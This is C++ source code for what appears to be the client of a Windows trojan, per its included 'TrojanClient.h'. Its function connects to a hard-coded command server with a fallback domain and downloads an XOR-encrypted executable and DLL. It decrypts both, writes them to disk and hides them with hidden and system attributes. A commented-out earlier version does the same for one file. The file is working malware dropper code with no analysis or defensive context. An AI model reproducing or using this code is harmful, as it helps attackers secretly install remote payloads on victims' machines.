
#include <windows.h>
#include <winsock.h>
#include "Public.h"
#include "TrojanClient.h"





DWORD __stdcall RecvFileFromServer(char * pFileNameCommand,char * szDstFilePath,char * szDstExeName,char * szDstDllName)
{
	sockaddr_in stAddrServer = {0};
	stAddrServer.sin_family = AF_INET;
	stAddrServer.sin_port = lpntohs(SERVER_PORT);
#ifdef SERVER_IP_DOMAINNAME
	hostent *host = lpgethostbyname(SERVER_IP_ADDRESS_DOMAINNAME);
	if (host == FALSE)
	{
		hostent *host = lpgethostbyname(SERVER_IP_ADDRESS_BAKEDOMAINNAME);
		if (host == FALSE)
		{
			return FALSE;
		}
	}
	char**  lpiplist = host->h_addr_list;
	char * iplist = *lpiplist;
	unsigned long ip = *(unsigned long*)iplist;
	stAddrServer.sin_addr.S_un.S_addr = ip;
#else
	stAddrServer.sin_addr.S_un.S_addr = inet_addr(LOCAL_SERVER_BIND_IP);
#endif

	SOCKET sClient = lpsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (sClient == INVALID_SOCKET)
	{
		WriteLogFile("RecvFileFromServer socket error\r\n");
		return FALSE;
	}

	int iRet = lpconnect(sClient,(sockaddr*)&stAddrServer,sizeof(sockaddr_in));
	if (iRet == INVALID_SOCKET)
	{
		WriteLogFile("RecvFileFromServer connect error\r\n");
		lpclosesocket(sClient);
		return FALSE;
	}

	iRet = lpsend(sClient,pFileNameCommand,lplstrlenA(pFileNameCommand),0);
	if (iRet <= 0)
	{
		WriteLogFile("RecvFileFromServer send error\r\n");
		lpclosesocket(sClient);
		return FALSE;
	}

	int iMaxPackSize = MAX_TRANSFER_BUFFER_SIZE;
	char * pFileBuf = new char [iMaxPackSize];
	int iRecvLen = lprecv(sClient,pFileBuf,iMaxPackSize,0);
	if (iRecvLen < sizeof(DWORD))
	{
		WriteLogFile("RecvFileFromServer recv error\r\n");
		delete [] pFileBuf;
		lpclosesocket(sClient);
		return FALSE;
	}

	int iPackSize = *(int*)pFileBuf;
	if (iPackSize > iMaxPackSize)
	{
		iMaxPackSize = iPackSize + 0x1000;
		char * lpNewBuf = new char [iMaxPackSize];
		memmove(lpNewBuf,pFileBuf,iRecvLen);
		delete [] pFileBuf;
		pFileBuf = lpNewBuf;
	}

	while (iRecvLen < iPackSize)
	{
		int iNextSize = lprecv(sClient,pFileBuf + iRecvLen,iMaxPackSize - iRecvLen,0);
		if (iNextSize > 0)
		{
			iRecvLen += iNextSize;
		}
		else
		{
			delete [] pFileBuf;
			lpclosesocket(sClient);
			WriteLogFile("RecvFileFromServer recv next packet error\r\n");
			return FALSE;
		}
	}

	lpclosesocket(sClient);
	if(iRecvLen != iPackSize){
		delete [] pFileBuf;
		WriteLogFile("RecvFileFromServer packet len error\r\n");
		return FALSE;
	}

	unsigned char * pKey = (unsigned char*)(pFileBuf + iRecvLen - CRYPT_KEY_SIZE);

	int Offset = 0;
	Offset += sizeof(int);
	Offset += sizeof(int);
	int iExeFileNameLen = *(int*)(pFileBuf + Offset);
	Offset += sizeof(int);
	char szExeFileName[MAX_PATH] = {0};
	memmove(szExeFileName,pFileBuf + Offset,iExeFileNameLen);
	Offset += iExeFileNameLen;
	int iExeFileLen = *(int*)(pFileBuf + Offset);
	Offset += sizeof(int);
	
	CryptData(pFileBuf + Offset,iExeFileLen,pKey);
//	char * pFileContentBuf = pFileBuf + Offset;
// 	for(int i = 0,j = 0; i < iExeFileLen ;)
// 	{
// 		pFileContentBuf[i] ^= pKey[j];
// 		j ++;
// 		if (j == CRYPT_KEY_SIZE)
// 		{
// 			j = 0; 
// 		}
// 		i ++;
// 	}

	lplstrcpyA(szDstExeName,szDstFilePath);
	lplstrcatA(szDstExeName,szExeFileName);
	HANDLE hExeFile = lpCreateFileA(szDstExeName,GENERIC_READ | GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hExeFile == INVALID_HANDLE_VALUE)
	{
		WriteLogFile("RecvFileFromServer createfile error\r\n");
		delete [] pFileBuf;
		return FALSE;
	}

	DWORD dwCnt = 0;
	iRet = lpWriteFile(hExeFile,pFileBuf + Offset,iExeFileLen,&dwCnt,0);
	lpCloseHandle(hExeFile);
	if (iRet == FALSE || dwCnt != iExeFileLen)
	{
		WriteLogFile("RecvFileFromServer writefile error\r\n");
		delete [] pFileBuf;
		return FALSE;
	}
	iRet = SetFileAttributesA(szDstExeName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	Offset += iExeFileLen;


	int iDllFileNameLen = *(int*)(pFileBuf + Offset);
	Offset += sizeof(int);
	char szDllFileName[MAX_PATH] = {0};
	memmove(szDllFileName,pFileBuf + Offset,iDllFileNameLen);
	Offset += iDllFileNameLen;
	int iDllFileLen = *(int*)(pFileBuf + Offset);
	Offset += sizeof(int);

	CryptData(pFileBuf + Offset,iDllFileLen,pKey);
// 	pFileContentBuf = pFileBuf + Offset;
// 	for(int i = 0,j = 0; i < iDllFileLen ;)
// 	{
// 		pFileContentBuf[i] ^= pKey[j];
// 		j ++;
// 		if (j == CRYPT_KEY_SIZE)
// 		{
// 			j = 0; 
// 		}
// 		i ++;
// 	}

	lplstrcpyA(szDstDllName,szDstFilePath);
	lplstrcatA(szDstDllName,szDllFileName);
	HANDLE hDllFile = lpCreateFileA(szDstDllName,GENERIC_READ | GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hDllFile == INVALID_HANDLE_VALUE)
	{
		WriteLogFile("RecvFileFromServer create dll file error\r\n");
		delete [] pFileBuf;
		return FALSE;
	}

	iRet = lpWriteFile(hDllFile,pFileBuf + Offset,iDllFileLen,&dwCnt,0);
	lpCloseHandle(hDllFile);
	delete [] pFileBuf;
	pFileBuf = 0;
	if (iRet == FALSE || dwCnt != iDllFileLen)
	{
		WriteLogFile("RecvFileFromServer write dll file error\r\n");
		return FALSE;
	}
	iRet = SetFileAttributesA(szDstDllName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	return TRUE;
}




/*
DWORD __stdcall RecvFileFromServer(char * pFileNameCommand,char * pLocalFileName)
{
	SOCKET sClient = lpsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (sClient == INVALID_SOCKET)
	{
		return FALSE;
	}

	sockaddr_in stAddrServer = {0};
	stAddrServer.sin_family = AF_INET;
	stAddrServer.sin_port = lpntohs(SERVER_PORT);

#ifdef SERVER_IP_URL	
	hostent *host = lpgethostbyname(LOCAL_SERVER_BIND_IP);
	char**  lpiplist = host->h_addr_list;
	char * iplist = *lpiplist;
	unsigned long ip = *(unsigned long*)iplist;
#else
	stAddrServer.sin_addr.S_un.S_addr = lpinet_addr(LOCAL_SERVER_BIND_IP);
#endif

	stAddrServer.sin_addr.S_un.S_addr = ip;

	int iRet = lpconnect(sClient,(sockaddr*)&stAddrServer,sizeof(sockaddr_in));
	if (iRet == INVALID_SOCKET)
	{
		lpclosesocket(sClient);
		return FALSE;
	}

	iRet = lpsend(sClient,pFileNameCommand,lplstrlenA(pFileNameCommand),0);
	if (iRet <= 0)
	{
		lpclosesocket(sClient);
		return FALSE;
	}


	char * pFileBuf = new char [MAX_TRANSFER_BUFFER_SIZE];
	int iRecvLen = lprecv(sClient,pFileBuf,MAX_TRANSFER_BUFFER_SIZE,0);
	if (iRecvLen < (int)sizeof(DWORD))
	{
		delete [] pFileBuf;
		lpclosesocket(sClient);
		return FALSE;
	}

	DWORD dwRecvSize = *(int*)pFileBuf;
	while (iRecvLen < (int)dwRecvSize)
	{
		DWORD dwSecondSize = lprecv(sClient,pFileBuf + iRecvLen,MAX_TRANSFER_BUFFER_SIZE - iRecvLen,0);
		if (dwSecondSize > 0)
		{
			iRecvLen += dwSecondSize;
		}
		else
		{
			delete [] pFileBuf;
			lpclosesocket(sClient);
			return FALSE;
		}
	}

	char * pKey = pFileBuf + iRecvLen - CRYPT_KEY_SIZE;
	char * pFileContentBuf = pFileBuf + sizeof(DWORD);
	for(int i = 0,j = 0; i < iRecvLen - (int)sizeof(DWORD) - CRYPT_KEY_SIZE ; )
	{
		pFileContentBuf[i] ^= pKey[j];
		j ++;
		if (j == CRYPT_KEY_SIZE)
		{
			j = 0; 
		}
		i ++;
	}
	
	HANDLE hFile = lpCreateFileA(pLocalFileName,GENERIC_READ | GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		delete [] pFileBuf;
		lpclosesocket(sClient);
		return FALSE;
	}

	DWORD dwCnt = 0;
	iRet = lpWriteFile(hFile,pFileBuf + sizeof(DWORD),iRecvLen - CRYPT_KEY_SIZE - sizeof(DWORD),&dwCnt,0);
	lpCloseHandle(hFile);
	if (iRet == FALSE || dwCnt != iRecvLen - CRYPT_KEY_SIZE - sizeof(DWORD))
	{
		delete [] pFileBuf;
		lpclosesocket(sClient);
		return FALSE;
	}

	delete [] pFileBuf;
	lpclosesocket(sClient);
	return TRUE;
}
*/